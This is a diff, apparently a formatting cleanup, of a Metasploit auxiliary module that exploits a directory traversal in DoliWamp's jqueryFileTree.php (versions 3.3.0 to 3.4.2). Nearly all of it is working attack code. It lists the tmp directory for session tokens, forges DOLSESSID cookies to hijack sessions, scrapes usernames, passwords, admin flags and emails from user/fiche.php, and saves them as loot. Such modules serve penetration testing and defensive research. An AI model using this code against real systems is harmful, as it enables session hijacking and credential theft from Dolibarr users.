@@ -8,31 +8,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'           => "DoliWamp 'jqueryFileTree.php' Traversal Gather Credentials",
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => "DoliWamp 'jqueryFileTree.php' Traversal Gather Credentials",
+        'Description' => %q{
           This module will extract user credentials from DoliWamp - a WAMP
-        packaged installer distribution for Dolibarr ERP on Windows - versions
-        3.3.0 to 3.4.2 by hijacking a user's session. DoliWamp stores session
-        tokens in filenames in the 'tmp' directory. A directory traversal
-        vulnerability in 'jqueryFileTree.php' allows unauthenticated users
-        to retrieve session tokens by listing the contents of this directory.
-        Note: All tokens expire after 30 minutes of inactivity by default.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => 'bcoles',
-      'References'     =>
-        [
+          packaged installer distribution for Dolibarr ERP on Windows - versions
+          3.3.0 to 3.4.2 by hijacking a user's session. DoliWamp stores session
+          tokens in filenames in the 'tmp' directory. A directory traversal
+          vulnerability in 'jqueryFileTree.php' allows unauthenticated users
+          to retrieve session tokens by listing the contents of this directory.
+          Note: All tokens expire after 30 minutes of inactivity by default.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'bcoles',
+        'References' => [
           ['URL', 'https://doliforge.org/tracker/?func=detail&aid=1212&group_id=144'],
           ['URL', 'https://github.com/Dolibarr/dolibarr/commit/8642e2027c840752c4357c4676af32fe342dc0cb']
         ],
-      'DisclosureDate' => '2014-01-12'))
+        'DisclosureDate' => '2014-01-12',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
     register_options(
       [
-        OptString.new('TARGETURI',      [true, 'The path to Dolibarr', '/dolibarr/']),
+        OptString.new('TARGETURI', [true, 'The path to Dolibarr', '/dolibarr/']),
         OptString.new('TRAVERSAL_PATH', [true, 'The traversal path to the application tmp directory', '../../../../../../../../tmp/'])
-      ])
+      ]
+    )
   end
 
   #
@@ -42,11 +50,12 @@ class MetasploitModule < Msf::Auxiliary
     tokens = nil
     print_status("Finding session tokens...")
     res = send_request_cgi({
-      'method'    => 'POST',
-      'uri'       => normalize_uri(
+      'method' => 'POST',
+      'uri' => normalize_uri(
         target_uri.path,
-        'includes/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.php'),
-      'cookie'    => @cookie,
+        'includes/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.php'
+      ),
+      'cookie' => @cookie,
       'vars_post' => { 'dir' => datastore['TRAVERSAL_PATH'] }
     })
     if !res
@@ -69,21 +78,21 @@ class MetasploitModule < Msf::Auxiliary
   def get_user_info(user_id)
     vprint_status("Retrieving user's credentials")
     res = send_request_cgi({
-      'method'    => 'GET',
-      'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
-      'cookie'    => @cookie,
-      'vars_get'  => Hash[{
-        'action'    => 'edit',
-        'id'        => "#{user_id}"
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'user/fiche.php'),
+      'cookie' => @cookie,
+      'vars_get' => Hash[{
+        'action' => 'edit',
+        'id' => "#{user_id}"
       }.to_a.shuffle]
     })
     if !res
       print_error("Connection failed")
     elsif res.body =~ /User card/
       record = [
-        res.body.scan(/name="login" value="([^"]+)"/             ).flatten.first,
-        res.body.scan(/name="password" value="([^"]+)"/          ).flatten.first,
-        res.body.scan(/name="superadmin" value="\d">(Yes|No)/    ).flatten.first,
+        res.body.scan(/name="login" value="([^"]+)"/).flatten.first,
+        res.body.scan(/name="password" value="([^"]+)"/).flatten.first,
+        res.body.scan(/name="superadmin" value="\d">(Yes|No)/).flatten.first,
         res.body.scan(/name="email" class="flat" value="([^"]+)"/).flatten.first
       ]
       unless record.empty?
@@ -100,8 +109,8 @@ class MetasploitModule < Msf::Auxiliary
   #
   def get_user_id
     res = send_request_cgi({
-      'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
-      'cookie'    => @cookie
+      'uri' => normalize_uri(target_uri.path, 'user/fiche.php'),
+      'cookie' => @cookie
     })
     if !res
       print_error("Connection failed")
@@ -119,8 +128,8 @@ class MetasploitModule < Msf::Auxiliary
   #
   def create_cookie(token)
     res = send_request_cgi({
-      'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
-      'cookie'    => "DOLSESSID_#{Rex::Text.rand_text_alphanumeric(10)}=#{token}"
+      'uri' => normalize_uri(target_uri.path, 'user/fiche.php'),
+      'cookie' => "DOLSESSID_#{Rex::Text.rand_text_alphanumeric(10)}=#{token}"
     })
     if !res
       print_error("Connection failed")
@@ -136,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
   # Stolen from modules/auxiliary/scanner/ftp/titanftp_xcrc_traversal.rb
   #
   def progress(current, total)
-    done    = (current.to_f / total.to_f) * 100
+    done = (current.to_f / total.to_f) * 100
     percent = "%3.2f%%" % done.to_f
     vprint_status("Trying to hijack a session - " +
       "%7s done (%d/%d tokens)" % [percent, current, total])
@@ -177,6 +186,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     return unless tokens = get_session_tokens
+
     credentials = []
     print_status("Trying to hijack a session...")
     tokens.flatten.each_with_index do |token, index|
@@ -191,8 +201,8 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
     cred_table = Rex::Text::Table.new(
-      'Header'  => 'Dolibarr User Credentials',
-      'Indent'  => 1,
+      'Header' => 'Dolibarr User Credentials',
+      'Indent' => 1,
       'Columns' => ['Username', 'Password', 'Admin', 'E-mail']
     )
     credentials.each do |record|
@@ -208,17 +218,18 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_line
     print_line("#{cred_table}")
-    loot_name     = 'dolibarr.traversal.user.credentials'
-    loot_type     = 'text/csv'
+    loot_name = 'dolibarr.traversal.user.credentials'
+    loot_type = 'text/csv'
     loot_filename = 'dolibarr_user_creds.csv'
-    loot_desc     = 'Dolibarr User Credentials'
+    loot_desc = 'Dolibarr User Credentials'
     p = store_loot(
       loot_name,
       loot_type,
       rhost,
       cred_table.to_csv,
       loot_filename,
-      loot_desc)
+      loot_desc
+    )
     print_status("Credentials saved in: #{p}")
   end
 end
